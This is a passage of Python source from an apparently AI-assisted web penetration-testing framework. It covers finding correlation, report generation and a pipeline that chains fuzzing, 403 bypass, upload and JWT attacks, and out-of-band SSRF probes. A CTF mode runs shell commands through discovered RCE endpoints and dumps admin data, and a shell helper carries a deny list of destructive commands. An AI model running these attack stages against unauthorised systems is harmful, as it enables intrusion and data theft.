        has_supporting_signal = bool((f.evidence or "").strip() or (f.tool_output or "").strip())
        if (f.baseline_diff == "{}" or not f.baseline_diff) and not has_supporting_signal:
            return True
        body = f.response_raw.lower()
        fp_keywords = ["access denied", "blocked by", "firewall", "captcha", "bot protection"]
        if any(k in body for k in fp_keywords) and f.confidence < 70:
            if not f.suppression_reason:
                f.suppression_reason = "Response body matches generic blocking page."
            return True
        return False


# ─────────────────────────────────────────────────────────────────────────────
# CORRELATOR
# ─────────────────────────────────────────────────────────────────────────────
class Correlator:
    def __init__(self, ai: AIEngine):
        self.ai = ai

    def correlate(self, findings: list[Finding], signals: list[dict]) -> list[Finding]:
        if not signals:
            return findings
        by_url = collections.defaultdict(list)
        for s in signals:
            by_url[s.get("url","")].append(s)
        new_findings = []
        for url, url_signals in by_url.items():
            if len(url_signals) >= 2:
                correlated = self.ai.correlate(url_signals)
                for c in correlated:
                    if c.get("confidence", 0) >= MIN_CONFIDENCE:
                        new_findings.append(Finding(
                            owasp_id   = c.get("owasp_id", "A05"),
                            owasp_name = c.get("owasp_name", "Correlated Finding"),
                            title      = c.get("title", "Correlated weakness"),
                            risk       = c.get("risk", "Medium"),
                            confidence = c.get("confidence", 50),
                            url=url, method="", param="multiple",
                            payload="multiple signals",
                            evidence   = c.get("evidence", ""),
                            baseline_diff="", tool_output="",
                            request_raw="", response_raw="",
                            exploit_cmd="", remediation="",
                        ))
        return findings + new_findings


# ─────────────────────────────────────────────────────────────────────────────
# ENDPOINT GRAPH
# ─────────────────────────────────────────────────────────────────────────────
class EndpointGraph:
    def __init__(self):
        self.nodes : dict[str, dict] = {}
        self.edges : list[dict]      = []
        self.params: dict[str, dict] = {}
        self.roles : list[str]       = []
        self.flows : list[dict]      = []

    def add_endpoint(self, ep: Endpoint):
        key = f"{ep.method}:{ep.url}"
        self.nodes[key] = {
            "url": ep.url, "method": ep.method,
            "params": ep.params, "body_type": ep.body_type,
            "source": ep.discovered_by, "depth": ep.depth,
        }
        for p in ep.params:
            self.params[f"{key}:{p}"] = {"endpoint": key, "param": p, "value": ep.params[p]}

    def add_finding(self, ep: Endpoint, finding: Finding):
        key = f"{finding.method}:{finding.url}"
        if key in self.nodes:
            self.nodes[key].setdefault("findings", []).append({
                "owasp_id": finding.owasp_id,
                "risk": finding.risk,
                "title": finding.title,
            })

    def save(self, path: Path):
        path.write_text(json.dumps({
            "nodes": self.nodes, "edges": self.edges,
            "params": self.params, "roles": self.roles, "flows": self.flows,
        }, indent=2, default=str))

    def stats(self) -> dict:
        return {"endpoints": len(self.nodes), "params": len(self.params), "flows": len(self.flows)}


# ─────────────────────────────────────────────────────────────────────────────
# REPORTER
# ─────────────────────────────────────────────────────────────────────────────
class Reporter:
    def __init__(self, target: str, graph: EndpointGraph):
        self.target = target
        self.graph  = graph

    def generate(self, findings: list[Finding]) -> str:
        ts     = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        by_risk= collections.defaultdict(list)
        suppressed = []
        for f in findings:
            if not f.fp_filtered:
                by_risk[f.risk].append(f)
            else:
                suppressed.append(f)
        total  = sum(len(v) for v in by_risk.values())
        lines  = [
            f"# Pentest Report: {self.target}",
            f"**Date:** {ts}  ",
            f"**Total findings:** {total}  ",
            f"**Endpoints tested:** {self.graph.stats()['endpoints']}  ",
            "",
            "## Executive Summary",
            "| Risk | Count |",
            "|------|-------|",
        ]
        for risk in ["Critical", "High", "Medium", "Low", "Info"]:
            c = len(by_risk.get(risk, []))
            if c:
                lines.append(f"| **{risk}** | {c} |")
        lines += ["", "---", "## Findings"]
        for risk in ["Critical", "High", "Medium", "Low", "Info"]:
            for f in by_risk.get(risk, []):
                lines += [
                    f"", f"### [{f.risk}] {f.owasp_id} — {f.title}",
                    f"| Field | Value |", f"|-------|-------|",
                    f"| **URL** | `{f.url}` |",
                    f"| **Method** | `{f.method}` |",
                    f"| **Parameter** | `{f.param}` |",
                    f"| **OWASP** | {f.owasp_id} — {f.owasp_name} |",
                    f"| **Risk** | {f.risk} |",
                    f"| **Confidence** | {f.confidence}% |",
                    f"| **Confirmed** | {'✅ Yes' if f.confirmed else '⚠ Unconfirmed'} |",
                    "", f"**Evidence:** {f.evidence}", "",
                ]
                if f.request_raw:
                    lines += ["**Request:**", "```http", f.request_raw[:400], "```"]
                if f.exploit_cmd:
                    lines += ["**PoC:**", "```bash", f.exploit_cmd, "```"]
                lines += [f"**Remediation:** {f.remediation}", "", "---"]
        if suppressed:
            lines += ["", "## Suppressed Potentials"]
            for f in suppressed:
                lines += [
                    "",
                    f"### [{f.risk}] {f.title}",
                    f"- URL: `{f.url}`",
                    f"- Confidence: {f.confidence}%",
                    f"- Why suppressed: {f.suppression_reason or 'Filtered during false-positive reduction.'}",
                ]
                if f.evidence:
                    lines.append(f"- Evidence: {f.evidence[:300]}")
        return "\n".join(lines)

    def save(self, findings: list[Finding]) -> Path:
        ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r'[^\w.]', '_', self.target)
        md_path    = REPORT_DIR / f"pentest_{safe}_{ts}.md"
        json_path  = REPORT_DIR / f"pentest_{safe}_{ts}.json"
        graph_path = REPORT_DIR / f"pentest_{safe}_{ts}_graph.json"
        md_path.write_text(self.generate(findings), encoding="utf-8")
        json_path.write_text(json.dumps([f.__dict__ for f in findings], indent=2, default=str), encoding="utf-8")
        self.graph.save(graph_path)
        console.print(f"\n[bold green]✅ Reports saved:[/bold green]")
        console.print(f"   📄 {md_path}")
        console.print(f"   📊 {json_path}")
        console.print(f"   🗂  {graph_path}")
        return md_path


# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────
def _run_cmd(cmd: str, timeout: int = 60) -> dict:
    dangerous = ["rm -rf /", "mkfs", "dd if=", ":(){ ", "shutdown", "reboot"]
    for d in dangerous:
        if d in cmd:
            return {"success": False, "output": f"Blocked: {d}", "cmd": cmd}
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"success": p.returncode == 0, "output": (p.stdout + p.stderr)[:10000], "cmd": cmd}
    except subprocess.TimeoutExpired:
        return {"success": False, "output": f"Timeout after {timeout}s", "cmd": cmd}
    except Exception as e:
        return {"success": False, "output": str(e), "cmd": cmd}

def _print_tools_status():
    tools = {
        "ffuf": "Param/dir fuzzer",
        "sqlmap": "SQL injection",
        "dalfox": "XSS scanner",
        "commix": "Command injection",
        "wfuzz": "Generic fuzzer",
        "nikto": "Web server scanner",
        "nmap": "Port/service scanner",
        "whatweb": "Tech fingerprint",
        "wafw00f": "WAF detector",
        "hydra": "Brute force",
    }
    if HAS_RICH:
        t = Table(title="Kali Tools Status", box=box.ROUNDED)
        t.add_column("Tool", style="cyan")
        t.add_column("Status", width=10)
        t.add_column("Purpose", style="dim")
        for tool, desc in tools.items():
            found = shutil.which(tool) is not None
            st = "[green]✓ Found[/green]" if found else "[red]✗ Missing[/red]"
            t.add_row(tool, st, desc)
        console.print(t)
    else:
        for tool, desc in tools.items():
            st = "✓" if shutil.which(tool) else "✗"
            print(f"  {st} {tool:12} {desc}")

    # Wordlist katalogi ham ko'rsatiladi
    console.print("\n[bold]Wordlist Catalog:[/bold]")
    summary = WordlistScanner.summary()
    for cat, count in summary.items():
        color = "green" if count > 0 else "dim"
        console.print(f"  [{color}]{cat:15} {count} wordlist(s)[/{color}]")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN PIPELINE
# ─────────────────────────────────────────────────────────────────────────────
class PentestPipeline:
    def __init__(self, args):
        self.args    = args
        self.session = SessionContext()
        self.client  = HTTPClient(self.session, timeout=DEFAULT_TIMEOUT)
        self.ai      = AIEngine()
        self.graph   = EndpointGraph()
        self.wl_selector = AIWordlistSelector(self.ai)
        # V7 MEGA — yangi komponentlar
        self.oob     = OOBClient()
        self.ctf     = getattr(args, "ctf", False)

    def run(self):
        raw_input = self.args.target.rstrip("/")

        console.print(BANNER)
        _print_tools_status()
        console.print(f"\n[bold]Target input:[/bold] {raw_input}")
        console.print(f"[bold]Mode:[/bold]   {self.args.mode}")
        console.print(f"[bold]Deep:[/bold]   {self.args.deep}")
        console.print(f"[bold]CTF:[/bold]    {self.ctf}\n")

        # ── OOB setup (interactsh) ────────────────────────────────────────
        oob_domain = ""
        if getattr(self.args, "oob", False):
            console.print(f"\n[cyan]━━ OOB SETUP ━━[/cyan]")
            if self.oob.start():
                oob_domain = self.oob.domain
                console.print(f"  [green]✓ OOB ready: {oob_domain}[/green]")
            else:
                console.print("  [dim yellow]  interactsh-client topilmadi — OOB o'chirildi[/dim yellow]")

        # Step 0: RECON — domain/IP tahlil, port scan, HTTP target aniqlash
        recon_engine = ReconEngine(self.ai)
        recon_result = recon_engine.run(raw_input)

        # Primary HTTP target tanlash
        if recon_result.http_targets:
            primary = recon_result.http_targets[0]
            target  = primary["url"].rstrip("/")
            console.print(f"  [bold green]Primary target: {target}[/bold green]"
                          + (f"  [dim]({primary.get('ai_reason','')})[/dim]"
                             if primary.get("ai_reason") else ""))
        else:
            # Recon topilmasa — input'ni to'g'ridan ishlatish
            target = raw_input
            if not target.startswith("http"):
                target = "http://" + target
            console.print(f"  [dim yellow]  Recon found no HTTP targets — using {target}[/dim yellow]")

        # WAF ogohlantirish
        if recon_result.waf not in ("none", "unknown", ""):
            console.print(
                f"\n  [bold yellow]⚠ WAF detected: {recon_result.waf}[/bold yellow]\n"
                f"  [dim]  Fuzzing may be blocked/rate-limited. Consider slow mode.[/dim]"
            )

        # Step 1: Session
        session_mgr = SessionManager(self.client, self.ai)
        if self.args.auth_url:
            login_url = urllib.parse.urljoin(target + "/", self.args.auth_url.lstrip("/"))
            console.print(f"[cyan]━━ SESSION SETUP ━━[/cyan]")
            if self.args.user and self.args.password:
                session_mgr.add_role("user", login_url, self.args.user, self.args.password)
                self.graph.roles.append("user")
            if self.args.admin_user and self.args.admin_pass:
                session_mgr.add_role("admin", login_url, self.args.admin_user, self.args.admin_pass)
                self.graph.roles.append("admin")

        # Step 2: Baseline + Smart Fuzz Profile
        console.print(f"\n[cyan]━━ FINGERPRINTING ━━[/cyan]")
        baseline     = BaselineEngine(self.client)
        baseline.build_custom_404(target)   # eski compat
        smart_profile = baseline.build_smart_profile(target, self.ai, depth=3)

        # Step 3: Crawl (texnologiya aniqlash bilan)
        console.print(f"\n[cyan]━━ CRAWLER ━━[/cyan]")
        crawler   = Crawler(self.client, self.ai, target)
        endpoints = crawler.crawl(max_depth=3 if self.args.deep else 2)
        site_tech = crawler.site_tech
        console.print(f"[bold]Site technology:[/bold] {site_tech}")
        for ep in endpoints:
            self.graph.add_endpoint(ep)

        # Step 4: Param discovery (AI wordlist selector bilan)
        console.print(f"\n[cyan]━━ PARAMETER DISCOVERY ━━[/cyan]")
        discoverer = ParamDiscoverer(self.client, self.wl_selector)
        enriched   = []
        for ep in endpoints[:MAX_URLS]:
            ep2 = discoverer.discover(ep)
            enriched.append(ep2)
            self.graph.add_endpoint(ep2)
        console.print(f"[green]✓ {len(enriched)} endpoints enriched[/green]")

        # Step 5: Page analysis
        console.print(f"\n[cyan]━━ PAGE ANALYSIS ━━[/cyan]")
        high_risk_eps = sorted(enriched, key=lambda e: e.score, reverse=True)[:20]

        for aw in crawler.auth_wall_pages:
            # custom_404_branded — SPA saytning soft-404 sahifasi,
            # BAC tekshirish uchun emas, o'tkazib yuboriladi
            if aw.get("signal") == "custom_404_branded":
                console.print(f"  [dim]  ⚠ Skipping custom_404 auth-wall: {aw['url']} "
                              f"(SPA soft-404, not a real restriction)[/dim]")
                continue

            console.print(f"\n  [yellow]🔐 Auth-wall: {aw['url']}[/yellow]  "
                          f"[dim]status={aw['status']}  signal=\"{aw.get('signal','')}\"[/dim]")

            analysis = self.ai.analyze_page(
                aw["url"], aw["status"], aw["body_snippet"], {}, {"real": True}
            )
            page_type   = analysis.get("page_type", "unknown")
            description = analysis.get("description", "")
            children    = analysis.get("suggested_child_paths", [])
            console.print(f"  [dim]  AI: page_type={page_type}  desc={description}[/dim]")
            console.print(f"  [dim]  AI: suggests {len(children)} child path(s) to probe[/dim]")

            for child in children[:8]:
                child_url = self.args.target.rstrip("/") + child
                if child_url in crawler.visited:
                    continue

                # 1. Ulanishdan oldin redirect'ni kuzatmasdan so'rov yuborish
                #    (allow_redirects=False ekvivalenti — manual HEAD)
                cr = self.client.get(child_url)
                crawler.visited.add(child_url)

                raw_status  = cr["status"]
                body        = cr["body"]
                final_url   = cr.get("url", child_url)
                body_lower  = body.lower()[:800]

                # 2. Redirect to login tekshirish
                redirected_to_login = (
                    final_url != child_url and
                    any(x in final_url.lower() for x in ["/login", "/signin", "/auth", "/account"])
                )
                # Body'da login sahifasi belgilari
                login_body_signals = [
                    "login", "sign in", "username", "password",
                    "log in", "please log in", "authentication required",
                ]
                body_is_login = sum(1 for s in login_body_signals if s in body_lower) >= 2

                console.print(
                    f"  [dim]  → {child} : HTTP {raw_status}  "
                    f"final_url={final_url[-40:]}  "
                    f"redirect_to_login={redirected_to_login}  "
                    f"body_is_login={body_is_login}  "
                    f"body_size={len(body)}[/dim]"
                )

                if raw_status not in (200, 201, 202):
                    console.print(f"  [dim]  ✗ SKIP: status {raw_status} — not accessible[/dim]")
                    continue

                if redirected_to_login:
                    console.print(
                        f"  [dim yellow]  ✗ SKIP: {child_url} returned 200 but "
                        f"redirected to login page ({final_url[-50:]}) — NOT a BAC[/dim yellow]"
                    )
                    continue

                if body_is_login:
                    console.print(
                        f"  [dim yellow]  ✗ SKIP: {child_url} body contains login form "
                        f"signals — this is auth redirect masquerading as 200 — NOT a BAC[/dim yellow]"
                    )
                    continue

                # 3. AI'ga response'ni göster — real content mi yoksa login redirect mi?
                ai_verdict = self.ai.verify_child_access(
                    parent_url  = aw["url"],
                    child_url   = child_url,
                    child_status= raw_status,
                    child_body  = body,
                    child_headers = cr.get("headers", {}),
                    parent_signal = aw.get("signal", ""),
                )

                verdict      = ai_verdict.get("verdict", "unknown")
                ai_reason    = ai_verdict.get("reason", "")
                is_real_bac  = ai_verdict.get("is_real_bac", False)
                confidence   = ai_verdict.get("confidence", 0)

                console.print(
                    f"  [dim]  AI verdict: {verdict}  "
                    f"is_real_bac={is_real_bac}  "
                    f"confidence={confidence}%[/dim]"
                )
                console.print(f"  [dim]  AI reason: {ai_reason}[/dim]")

                if not is_real_bac or confidence < MIN_CONFIDENCE:
                    console.print(
                        f"  [dim yellow]  ✗ NOT BAC: {child_url} — "
                        f"{ai_reason}[/dim yellow]"
                    )
                    continue

                # Real BAC confirmed by AI
                console.print(
                    f"  [bold red]  🚨 AI-confirmed BAC: {child_url}[/bold red]\n"
                    f"  [red]     Reason: {ai_reason}[/red]"
                )
                crawler.acl_bypass_findings.append({
                    "parent_403":   aw["url"],
                    "child_200":    child_url,
                    "body_size":    len(body),
                    "body_snippet": body[:400],
                    "ai_reason":    ai_reason,
                    "confidence":   confidence,
                })

        for ep in high_risk_eps:
            r      = self.client.get(ep.url)
            is_200 = baseline.is_real_200(r)
            if r["status"] in (200, 403, 404):
                analysis = self.ai.analyze_page(ep.url, r["status"], r["body"], r["headers"], is_200)
                if analysis.get("is_custom_404") and not analysis.get("is_auth_wall"):
                    ep.score = 0
                    continue
                if analysis.get("risk") in ("Critical", "High"):
                    ep.score += 25

        # Step 5b: ACL bypass findings — faqat AI tasdiqlagan bypass'lar
        acl_findings = []
        for bypass in crawler.acl_bypass_findings:
            ai_reason  = bypass.get("ai_reason", "")
            confidence = bypass.get("confidence", 85)
            evidence   = (
                f"Parent {bypass['parent_403']} restricted, "
                f"child {bypass['child_200']} accessible ({bypass['body_size']} bytes). "
                f"AI: {ai_reason}"
            )
            f = Finding(
                owasp_id="A01", owasp_name="Broken Access Control",
                title=f"ACL Bypass: {urllib.parse.urlparse(bypass['child_200']).path} accessible without auth",
                risk="High", confidence=confidence,
                url=bypass["child_200"], method="GET", param="URL_PATH",
                payload=bypass["child_200"],
                evidence=evidence,
                baseline_diff="Restricted parent → accessible child",
                tool_output=bypass["body_snippet"][:400],
                request_raw=f"GET {bypass['child_200']} HTTP/1.1\nHost: {urllib.parse.urlparse(bypass['child_200']).netloc}",
                response_raw=bypass["body_snippet"][:400],
                exploit_cmd=f"curl -v '{bypass['child_200']}'",
                remediation="Enforce access control checks at every path level, not just the parent.",
                confirmed=True,
            )
            acl_findings.append(f)

        # Step 6: BAC multi-role
        bac_findings = list(acl_findings)
        if len(session_mgr.roles) >= 2:
            console.print(f"\n[cyan]━━ BAC/IDOR MULTI-ROLE CHECK ━━[/cyan]")
            for ep in enriched[:50]:
                bac = session_mgr.detect_bac(ep.url, ep.method)
                if bac:
                    ai_bac = self.ai.analyze_bac(bac)
                    if ai_bac and ai_bac.get("found") and ai_bac.get("confidence",0) >= MIN_CONFIDENCE:
                        f = Finding(
                            owasp_id=ai_bac.get("owasp_id","A01"),
                            owasp_name=ai_bac.get("owasp_name","Broken Access Control"),
                            title=ai_bac.get("title","BAC/IDOR via role comparison"),
                            risk=ai_bac.get("risk","High"), confidence=ai_bac.get("confidence",70),
                            url=ep.url, method=ep.method, param="role_context",
                            payload="multi-role comparison",
                            evidence=ai_bac.get("technical",""),
                            baseline_diff=json.dumps(bac["comparisons"])[:200],
                            tool_output="multi-role diff",
                            request_raw=f"{ep.method} {ep.url}",
                            response_raw=json.dumps(bac["responses"])[:400],
                            exploit_cmd=ai_bac.get("exploit_cmd",""),
                            remediation=ai_bac.get("remediation",""),
                        )
                        bac_findings.append(f)

        # Step 7: AI planner
        console.print(f"\n[cyan]━━ AI PLANNER ━━[/cyan]")
        planned = self.ai.plan_endpoints(enriched)
        console.print(f"[green]✓ AI prioritized {len(planned)} endpoints[/green]")

        # Step 8: OWASP Fuzzing (site_tech bilan)
        console.print(f"\n[cyan]━━ OWASP FUZZING ━━[/cyan]")
        kali   = KaliToolRunner(self.session, self.wl_selector)
        fuzzer = OWASPFuzzEngine(
            self.client, baseline, kali, self.ai,
            self.wl_selector, site_tech=site_tech
        )

        limit        = len(planned) if self.args.deep else min(len(planned), 30)
        all_findings = list(bac_findings)

        # ── Smart Directory/File Fuzzing ──────────────────────────────────────
        if shutil.which("ffuf") or shutil.which("gobuster"):
            console.print(f"\n[cyan]━━ SMART DIR FUZZING ━━[/cyan]")
            dir_findings = self._smart_dir_fuzz(
                target=target, kali=kali, baseline=baseline,
                profile=smart_profile, ai=self.ai,
            )
            all_findings.extend(dir_findings)
        lock         = threading.Lock()
        sema         = threading.Semaphore(MAX_WORKERS)
        threads      = []

        def fuzz_ep(ep):
            with sema:
                results = fuzzer.test_endpoint(ep)
                with lock:
                    all_findings.extend(results)

        for ep in planned[:limit]:
            console.print(f"[dim]  ▶ {ep.method} {ep.url[:70]} (score:{ep.score:.0f})[/dim]")
            t = threading.Thread(target=fuzz_ep, args=(ep,), daemon=True)
            threads.append(t)
            t.start()

        for t in threads:
            t.join(timeout=180)

        # ── NUCLEI CVE scan ────────────────────────────────────────────────
        console.print(f"\n[cyan]━━ NUCLEI CVE SCAN ━━[/cyan]")
        nuclei_runner = NucleiRunner()
        nuclei_hits   = nuclei_runner.run(target, site_tech, self.session)
        all_findings.extend(nuclei_hits)
        console.print(f"[green]✓ Nuclei: {len(nuclei_hits)} findings[/green]")

        # ── Recursive 403 bypass (BFS 3 qatlam) ───────────────────────────
        console.print(f"\n[cyan]━━ RECURSIVE 403 BYPASS ━━[/cyan]")
        r403_bypasser = Recursive403Bypasser(self.client, self.ai, self.wl_selector)
        forbidden_urls = []
        seen_forbidden = set()
        for path in sorted(crawler.forbidden_paths):
            if not path:
                continue
            if path.startswith(("http://", "https://")):
                full_url = path
            else:
                full_url = target.rstrip("/") + (path if path.startswith("/") else f"/{path}")
            if full_url not in seen_forbidden:
                seen_forbidden.add(full_url)
                forbidden_urls.append(full_url)
        for ep in enriched:
            if ep.url not in seen_forbidden and self.client.get(ep.url).get("status") == 403:
                seen_forbidden.add(ep.url)
                forbidden_urls.append(ep.url)
        console.print(f"  [dim]Queued {len(forbidden_urls)} forbidden roots for recursive bypass[/dim]")
        for url in forbidden_urls[:30]:
            console.print(f"  [dim]→ Recursive bypass: {url}[/dim]")
            bypass_hits = r403_bypasser.bypass(url, max_depth=3)
            all_findings.extend(bypass_hits)
        console.print(f"[green]✓ 403 bypass: {sum(1 for f in all_findings if f.tool=='recursive_403')} findings[/green]")

        # ── File Upload attack ─────────────────────────────────────────────
        upload_eps = [ep for ep in enriched if any(
            x in ep.url.lower() for x in
            ["upload","file","image","avatar","import","attach","media"])]
        if upload_eps:
            console.print(f"\n[cyan]━━ FILE UPLOAD ATTACK ━━[/cyan]")
            uploader = FileUploadAttacker(self.client, self.ai)
            for ep in upload_eps[:5]:
                upload_hits = uploader.attack(ep.url, site_tech)
                all_findings.extend(upload_hits)

        # ── JWT attack (alg:none + hashcat + role escalation) ─────────────
        jwt_token = (self.session.jwt_token or
                     getattr(self.session, "jwt_in_response", ""))
        if jwt_token:
            console.print(f"\n[cyan]━━ JWT ATTACK ━━[/cyan]")
            jwt_attacker = JWTAttacker(self.client, self.oob)
            jwt_hits     = jwt_attacker.attack(jwt_token, enriched[:30])
            all_findings.extend(jwt_hits)
            console.print(f"[green]✓ JWT: {len(jwt_hits)} findings[/green]")

        # ── WebSocket test ─────────────────────────────────────────────────
        ws_eps = [ep for ep in enriched if
                  ep.url.startswith(("ws://","wss://"))]
        if ws_eps:
            console.print(f"\n[cyan]━━ WEBSOCKET TEST ━━[/cyan]")
            ws_tester = WebSocketTester(self.ai)
            for ep in ws_eps[:3]:
                ws_hits = ws_tester.test(ep.url)
                all_findings.extend(ws_hits)

        # ── OOB payload injection (blind SSRF/CMDi/XXE) ───────────────────
        if oob_domain:
            console.print(f"\n[cyan]━━ OOB BLIND DETECTION ━━[/cyan]")
            oob_payloads = self.oob.payloads(token="pentest")
            console.print(f"  [dim]OOB payloads: {list(oob_payloads.keys())}[/dim]")
            # URL/param parametrlarda OOB SSRF payloadlarini yuborish
            ssrf_params  = ["url","redirect","src","dest","target","next",
                            "callback","return","load","fetch","path"]
            oob_hits_found = 0
            for ep in enriched[:20]:
                for param in (ep.params or {}).keys():
                    if param.lower() not in ssrf_params: continue
                    test_url = f"{ep.url}?{param}={oob_payloads['ssrf']}"
                    self.client.get(test_url)
                    time.sleep(0.5)
                    if self.oob.check(token="pentest", wait=1.0):
                        all_findings.append(Finding(
                            owasp_id="A10", owasp_name="SSRF",
                            title=f"Blind SSRF via OOB callback: {ep.url} param={param}",
                            risk="High", confidence=95,
                            url=ep.url, method=ep.method, param=param,
                            payload=oob_payloads["ssrf"],
                            evidence=f"OOB DNS/HTTP callback received for param '{param}'",
                            baseline_diff="oob_callback",
                            tool_output=f"interactsh callback: {oob_domain}",
                            request_raw=f"GET {test_url}",
                            response_raw="OOB callback received",
                            exploit_cmd=f"curl '{test_url}'",
                            remediation="Validate and whitelist allowed URLs for server-side requests.",
                            confirmed=True, oob=True, tool="oob_interactsh",
                        ))
                        oob_hits_found += 1
                        console.print(f"  [bold red]🎯 Blind SSRF OOB: {ep.url} [{param}][/bold red]")
            console.print(f"[green]✓ OOB: {oob_hits_found} blind findings[/green]")

        # ── CTF mode — exploit confirmed findings ──────────────────────────
        if self.ctf:
            console.print(f"\n[cyan]━━ CTF EXPLOIT CHAINS ━━[/cyan]")
            confirmed = [f for f in all_findings if f.confirmed and
                         f.risk in ("Critical","High")]
            for finding in confirmed[:5]:
                self._ctf_chain(finding, target, site_tech)

        # Step 9: Correlate
        console.print(f"\n[cyan]━━ CORRELATOR ━━[/cyan]")
        correlator   = Correlator(self.ai)
        all_findings = correlator.correlate(all_findings, fuzzer.signals)

        # Step 10: FP Filter
        console.print(f"\n[cyan]━━ FP FILTER ━━[/cyan]")
        fp_filter = FPFilter(self.ai, self.client)
        clean     = fp_filter.filter(all_findings)
        console.print(f"[green]✓ {len(clean)} findings kept, "
                      f"{len(all_findings)-len(clean)} FPs removed[/green]")

        for f in clean:
            for ep in enriched:
                if ep.url == f.url:
                    self.graph.add_finding(ep, f)

        # Step 11: Report
        # ── OOB stop ───────────────────────────────────────────────────────
        if oob_domain:
            self.oob.stop()

        console.print(f"\n[cyan]━━ REPORT ━━[/cyan]")
        reporter = Reporter(target, self.graph)
        reporter.save(all_findings)
        self._print_summary(clean)
        return clean


    def _ctf_chain(self, finding: Finding, target: str, tech: dict):
        """
        CTF mode: topilgan finding'dan exploitation chain yaratadi.
        AI flag.txt qidirish va privilege escalation yo'lini ko'rsatadi.
        """
        console.print(f"  [bold yellow]⚡ CTF Chain for: {finding.title[:60]}[/bold yellow]")

        # Flag qidirish paths
        flag_paths = [
            "/flag.txt", "/flag", "/root/flag.txt", "/home/ctf/flag.txt",
            "/var/flag.txt", "/tmp/flag.txt", "/flag.php", "/.flag",
        ]

        # RCE topilgan bo'lsa — flag o'qishga harakat
        if finding.tool in ("upload_attack",) or "RCE" in finding.title:
            cmd_url = finding.url
            for flag in flag_paths:
                test_url = f"{cmd_url}?cmd=cat+{flag}"
                r = self.client.get(test_url)
                flag_match = re.search(r'(?:HTB|CTF|FLAG|flag)\{[^}]+\}', r["body"])
                if flag_match:
                    console.print(f"  [bold green]🏁 FLAG FOUND: {flag_match.group()}[/bold green]")
                    finding.chain.append(f"FLAG: {flag_match.group()}")
                    finding.evidence += f"\n\n🏁 FLAG: {flag_match.group()}"
                    return

        # SSRF → internal service probe
        if finding.owasp_id == "A10" or "ssrf" in finding.title.lower():
            internal = ["http://127.0.0.1/","http://localhost/","http://169.254.169.254/",
                        "http://10.0.0.1/","http://192.168.1.1/"]
            console.print(f"  [dim]SSRF detected — probing internal services...[/dim]")
            finding.chain.append("SSRF → probe 169.254.169.254 (AWS metadata)")
            finding.chain.append("SSRF → probe 127.0.0.1:6379 (Redis)")
            finding.chain.append("SSRF → probe 127.0.0.1:27017 (MongoDB)")

        # BAC/IDOR → sensitive data dump
        if finding.owasp_id in ("A01",) and "admin" in finding.url.lower():
            console.print(f"  [dim]BAC → trying to dump users/config...[/dim]")
            dump_paths = ["/admin/users","/admin/config","/admin/dump","/api/users","/api/admin"]
            for dp in dump_paths:
                u = target + dp
                r = self.client.get(u)
                if r["status"] == 200 and len(r["body"]) > 200:
                    if any(k in r["body"].lower() for k in ["password","email","username","token"]):
                        console.print(f"  [bold red]  💀 Sensitive dump: {u} ({len(r['body'])} bytes)[/bold red]")
                        finding.chain.append(f"Sensitive data dump: {u}")
                        break

        # AI chain plan
        prompt = f"""
CTF pentest finding:
{json.dumps({"title":finding.title,"owasp":finding.owasp_id,"url":finding.url,"payload":finding.payload,"evidence":finding.evidence[:200]}, indent=2)}

Target tech: {json.dumps(tech)}

Create a step-by-step CTF exploitation chain to reach /root/flag.txt or admin access.
Return JSON: {{"steps":["step1","step2"],"flag_path":"/root/flag.txt","estimated_difficulty":"medium"}}
"""
        plan = self.ai._call(prompt) or {}
        steps = plan.get("steps", [])
        if steps:
            console.print(f"  [dim]AI chain ({len(steps)} steps):[/dim]")
            for i, step in enumerate(steps, 1):
                console.print(f"  [dim]  {i}. {str(step)[:100]}[/dim]")
                finding.chain.append(str(step))


    def _smart_dir_fuzz(self, target: str, kali: "KaliToolRunner",
                        baseline: "BaselineEngine", profile: "SmartFuzzProfile",
                        ai: "AIEngine") -> list:
        """
        Rekursiv smart directory fuzzing:

        1. Target uchun SmartFuzzProfile (allaqachon bor)
        2. ffuf yoki gobuster ishlatadi — profile'dan filter argumentlar
        3. Topilgan har bir narsani AI tekshiradi (real sahifami?)
        4. Yangi papka topilganda REKURSIV — uning ichida ham xuddi shu jarayon
        5. Har qatlamda YANGI SmartProfile hosil qilinadi (boshqa path, boshqa 404)
        6. Finding sifatida qaytariladi
        """
        findings        : list = []
        visited_dirs    : set  = set()
        queue_dirs      : list = [target.rstrip("/")]
        current_depth   : int  = 0
        max_depth       : int  = profile.depth

        # Dir fuzzing uchun wordlist
        ctx = {
            "url":        target,
            "param":      "dir_fuzz",
            "tech":       "dirs",
            "param_type": "dirs",
            "server":     "",
        }
        wordlist = self.wl_selector.select("dirs", ctx)
        if not wordlist or not Path(wordlist).exists():
            console.print("  [dim yellow]  ⚠ No dir wordlist — skipping smart dir fuzz[/dim yellow]")
            return findings

        while queue_dirs and current_depth <= max_depth:
            current_batch = list(queue_dirs)
            queue_dirs    = []

            for base_dir in current_batch:
                if base_dir in visited_dirs:
                    continue
                visited_dirs.add(base_dir)

                console.print(f"  [bold]→ Fuzzing:[/bold] {base_dir}  "
                              f"[dim](depth {current_depth}/{max_depth})[/dim]")

                # Bu papka uchun yangi SmartProfile
                if current_depth == 0:
                    cur_profile = profile  # Zaqon oldindan hisoblangan
                else:
                    console.print(f"  [dim]  Building new SmartProfile for {base_dir}...[/dim]")
                    cur_profile = baseline.build_smart_profile(base_dir, ai, depth=max_depth)

                # ffuf yoki gobuster
                if shutil.which("ffuf"):
                    result = kali.smart_ffuf(base_dir, wordlist, cur_profile, mode="dir")
                else:
                    result = kali.smart_gobuster(base_dir, wordlist, cur_profile)

                if not result.get("available", True):
                    console.print(f"  [dim]  Tool not available: {result.get("output","")}[/dim]")
                    continue

                hits = result.get("results", [])
                console.print(f"  [dim]  {len(hits)} candidates after filter[/dim]")

                # AI har candidate'ni tekshiradi
                for hit in hits:
                    hit_url  = hit.get("url") or (base_dir + "/" + hit.get("input","")).replace("//","/")
                    hit_size = hit.get("size", 0)
                    hit_status = hit.get("status", 0)

                    # Hit'ni GET qilib olish
                    resp = self.client.get(hit_url)
                    body = resp.get("body", "")

                    # AI tahlil
                    verdict = ai.analyze_dir_hit(
                        url         = hit_url,
                        status      = hit_status,
                        size        = hit_size,
                        words       = hit.get("words", 0),
